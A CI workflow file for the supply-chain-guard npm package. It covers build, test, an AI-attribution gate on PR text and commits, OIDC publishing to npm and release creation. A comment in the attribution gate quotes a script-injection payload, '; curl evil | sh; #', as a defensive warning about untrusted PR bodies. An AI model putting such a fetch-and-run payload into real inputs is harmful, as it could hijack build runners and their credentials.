name: CI

on:
  push:
    branches: [main]
    tags:
      # Full semver only (v5.2.35). The floating major ref `v5` is a BRANCH,
      # not a tag - matching `v*` here would let the major tag (if one ever
      # appears) trigger publish and try to re-publish an existing version.
      # See the v5.2.35 incident: a stray `v5` tag triggered a failed publish.
      - 'v[0-9]+.[0-9]+.[0-9]+'
  pull_request:
    branches: [main]
    # `edited` is required by the AI-attribution gate below. The default types are
    # opened/synchronize/reopened, none of which fire on a title or body edit, so
    # without it a PR can go green and then have the footer pasted into the body.
    types: [opened, synchronize, reopened, edited]
  workflow_dispatch:
    inputs:
      tag:
        description: 'Tag to publish (e.g. v5.0.0)'
        required: false

# Adding `edited` to the PR triggers means title/body edits now spawn runs on the same
# head sha. Without a concurrency group a run started before a body fix can finish after
# the run started by the fix, leaving the REQUIRED context reporting the stale red. Tag
# and main pushes are keyed by ref so a release is never cancelled by a later one.
concurrency:
  group: ci-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  build:
    name: Build and Test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          # Full history so the AI-attribution gate can walk the PR commit range.
          fetch-depth: 0

      - name: Setup Node.js
        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      # AI-attribution gate for the two surfaces that are NOT files in the repo:
      # the PR title/body and the commit messages. Tracked files (CHANGELOG.md,
      # which ci.yml turns into the GitHub Release body, plus README/docs) are
      # covered by the "ai-attribution" forbiddenPatterns rule in aahp.config.json,
      # which already ran as part of `npm run build` above.
      #
      # This lives inside "Build and Test" on purpose: that job is a REQUIRED
      # status check on main, so the gate blocks a merge today. A new top-level
      # job would be advisory only until branch protection is updated to require it.
      # dependabot is exempt for the same reason aahp-verify.yml exempts it: its PR
      # bodies quote upstream release notes verbatim, it cannot edit its own body,
      # and this step sits in a REQUIRED check with enforce_admins - so a quoted
      # trailer upstream would hard-block a security update with no way out.
      - name: No AI attribution in PR body or commit messages
        if: github.event_name == 'pull_request' && github.actor != 'dependabot[bot]'
        env:
          # The PR title and body are attacker-controlled: anyone who can open a PR
          # from a fork controls them. They MUST reach the script as environment
          # variables. Never write ${{ github.event.pull_request.body }} inside a
          # run: block - Actions substitutes the raw text into the script BEFORE
          # bash parses it, so a body containing '; curl evil | sh; #' would execute
          # on the runner. Below they are only ever read as quoted "$VAR", which
          # bash never re-parses as code.
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          # POSIX-ERE twin of the aahp.config.json "ai-attribution" rule; grep -E has
          # no (?:...) syntax, so the groups are plain (...). Keep the two in lockstep.
          # PROSE that merely describes a footer does not match, which is what keeps
          # this gate from flagging its own definition and CONTRIBUTING.md's wording.
          # Anchored on attribution PHRASING plus the anthropic no-reply address, not
          # on the brand name, so this repo's legitimate threat intelligence about
          # Claude-branded malware ("Claude Code leak campaign") does not trip it.
          PATTERN='(generated|created|authored|assisted|written)[ \t]+(with|by)[ \t]+\[?[^ ]{0,20}claude|(co-authored|assisted|generated|created)-by:[^\n]*(claude|anthropic)|noreply@anthropic\.com|\[Claude Code\]\(|claude\.(com/claude-code|ai/code)'
          fail=0

          # Fail closed on a malformed event payload. Without this, an empty BASE_SHA
          # makes git resolve "..$HEAD_SHA" as "HEAD..$HEAD_SHA", which is empty on the
          # checked-out merge commit, so git exits 0 and the gate PASSES having
          # inspected nothing.
          if [ -z "$BASE_SHA" ] || [ -z "$HEAD_SHA" ]; then
            echo "::error title=PR sha missing::base.sha or head.sha absent from the event payload; refusing to pass without checking."
            exit 1
          fi
          for sha in "$BASE_SHA" "$HEAD_SHA"; do
            if ! git rev-parse --verify --quiet "$sha^{commit}" >/dev/null; then
              echo "::error title=PR sha not fetched::$sha is not in the object graph. Usually a synchronize race (the head moved mid-run); re-run the job."
              exit 1
            fi
          done

          if printf '%s' "$PR_TITLE" | grep -Eiq -- "$PATTERN"; then
            echo "::error title=AI attribution in PR title::Remove the tool/model attribution. The author of record is the human. See CONTRIBUTING.md."
            fail=1
          fi

          if printf '%s' "$PR_BODY" | grep -Eiq -- "$PATTERN"; then
            echo "::error title=AI attribution in PR body::Remove the 'Generated with Claude Code' footer from the PR body. This repo is public and PR bodies are indexed."
            fail=1
          fi

          # Fail closed: if the range cannot be read, do NOT silently pass. A bare
          # `git log ... | grep` would swallow the git failure and report clean.
          if ! SHAS=$(git log --format='%H' "$BASE_SHA..$HEAD_SHA"); then
            echo "::error title=Cannot read PR commit range::git log $BASE_SHA..$HEAD_SHA failed even though both endpoints verified. Inspect the checkout step."
            exit 1
          fi

          # Per commit, so a revert or cherry-pick can be exempted. main carries 137
          # commits whose messages contain an inherited trailer, and `git revert` copies
          # the body verbatim: without this, reverting the repo's own history would be
          # permanently unmergeable through a rule the author never typed.
          for sha in $SHAS; do
            BODY=$(git log -1 --format='%B' "$sha")
            case "$BODY" in
              *"This reverts commit"*|*"cherry picked from commit"*)
                echo "note: skipping $sha (revert/cherry-pick, trailer is inherited)"
                continue
                ;;
            esac
            if printf '%s' "$BODY" | grep -Eiq -- "$PATTERN"; then
              echo "::error title=AI attribution in a commit message::$sha carries an attribution footer or a Co-Authored-By trailer. Rewrite it before merging - once merged the message is permanent. See CONTRIBUTING.md."
              git log -1 --format='  %h %s' "$sha" >&2
              fail=1
            fi
            # The identity fields are published on the commit page even when the body is
            # clean, so "the author of record is the human" has to cover them too.
            IDENT=$(git log -1 --format='%an%n%ae%n%cn%n%ce' "$sha")
            if printf '%s' "$IDENT" | grep -Eiq -- 'claude|anthropic\.com'; then
              echo "::error title=AI attribution in commit identity::$sha is authored or committed as an AI identity ($(printf '%s' "$IDENT" | tr '\n' ' ')). Re-author it with git commit --amend --reset-author. See CONTRIBUTING.md."
              fail=1
            fi
          done

          if [ "$fail" -ne 0 ]; then
            exit 1
          fi
          echo "No AI attribution in PR title, body or commit messages."

      # AAHP conformance (v3.6+): the pinned @elvatis_com/aahp CLI self-checks handoff
      # set, MANIFEST schema, grounding, the exact-version dep pin, changelog format and
      # version sync. --no-install forces the pinned node_modules copy, not a fetched one.
      - name: AAHP conformance
        run: npx --no-install aahp doctor . --json

      - name: Test
        run: npm run test:coverage

      - name: Upload coverage summary
        if: always()
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: coverage-summary
          path: coverage/coverage-summary.json
          retention-days: 14

  publish:
    name: Publish to npm
    needs: build
    runs-on: ubuntu-latest
    # Full semver tag (contains a dot) or manual dispatch. A major-only ref
    # like refs/tags/v5 has no dot and must never reach publish.
    if: (startsWith(github.ref, 'refs/tags/v') && contains(github.ref, '.')) || github.event_name == 'workflow_dispatch'
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Setup Node.js
        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      # npm Trusted Publishing (OIDC) requires npm >= 11.5.1. Node 20
      # LTS bundles npm 10.x, which silently falls back to classic
      # token auth even when id-token: write is granted. Upgrade
      # explicitly so OIDC kicks in.
      # Pin to the 11.x line: npm@latest is now npm 12, which requires
      # Node >=22 and hard-fails EBADENGINE on this Node 20 runner (broke
      # the v5.11.0 publish on 2026-07-09). npm 11.x is OIDC-capable AND
      # Node-20-compatible. Bump this (and node-version) together if the
      # publish runner ever moves to Node 22+.
      - name: Upgrade npm for OIDC trusted publishing
        run: npm install -g npm@11

      # Auth happens via OIDC against the npmjs Trusted Publisher
      # configured for this package + this workflow. No NPM_TOKEN
      # secret is used or needed.
      - name: Publish to npm
        run: npm publish --access public --provenance

  release:
    name: Create GitHub Release
    needs: publish
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v') && contains(github.ref, '.')
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Extract changelog for this version
        id: changelog
        run: |
          VERSION="${GITHUB_REF_NAME#v}"
          # Extract the section for this version from CHANGELOG.md (moved out of
          # README.md in v5.2.45 to keep the landing page readable).
          # NOT an awk range pattern: /start/,/end/ terminates on the SAME line
          # when the heading matches both expressions, which yielded one line,
          # then head -n -1 emptied it - every release before v5.2.45 silently
          # shipped the fallback text. Flag-based scan fixed it.
          # Literal prefix match via index() - avoids awk-variant differences in how
          # "\\[" inside a string-regex is handled (gawk collapses it to a char class).
          NOTES=$(awk -v ver="$VERSION" '
            index($0, "## [" ver "]") == 1 {flag=1; print; next}
            flag && index($0, "## [") == 1 {exit}
            flag {print}
          ' CHANGELOG.md)
          # Fallback if nothing found
          if [ -z "$NOTES" ]; then
            NOTES="See [CHANGELOG.md](https://github.com/${{ github.repository }}/blob/main/CHANGELOG.md) for full changelog."
          fi
          # Write to file to preserve multiline
          echo "$NOTES" > release_notes.md

      - name: Create GitHub Release
        run: |
          gh release create "$GITHUB_REF_NAME" \
            --title "supply-chain-guard $GITHUB_REF_NAME" \
            --notes-file release_notes.md
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  update-major-branch:
    name: Update major version branch
    needs: release
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v') && contains(github.ref, '.')
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      # Floating major-version branch so `uses: homeofe/supply-chain-guard@v5`
      # always resolves to the latest v5.x.y release. This is a BRANCH, not a
      # tag - branches are meant to move, so this fast-forward push does not
      # violate the "never move tags" rule. Each release commit descends from
      # the previous one on main, so this is always a fast-forward (no --force).
      - name: Fast-forward the major-version branch to this release
        run: |
          VERSION="${GITHUB_REF_NAME#v}"   # 5.2.34
          MAJOR="v${VERSION%%.*}"          # v5
          git push origin "HEAD:refs/heads/${MAJOR}"
